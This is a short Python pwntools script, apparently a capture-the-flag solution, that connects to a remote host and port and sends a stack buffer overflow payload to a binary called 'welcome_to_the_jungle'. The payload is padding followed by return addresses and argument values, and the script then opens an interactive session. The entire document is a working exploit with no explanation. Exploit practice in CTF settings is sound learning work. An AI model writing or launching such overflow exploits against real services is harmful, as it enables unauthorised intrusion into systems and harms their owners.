from pwn import *

#io = process("./welcome_to_the_jungle")
io = remote("15.206.149.154", 30991)
context.log_level = 'debug' 

io.recvuntil("Name:\n")


payload = b'a' * 24
payload += p64(0x0000000000401227)
payload += p64(0xdeadca1fdeadca1f)
payload += p64(0xacedc0deacedc0de)
payload += p64(0x000000000040122a)

io.sendline(payload)
io.interactive()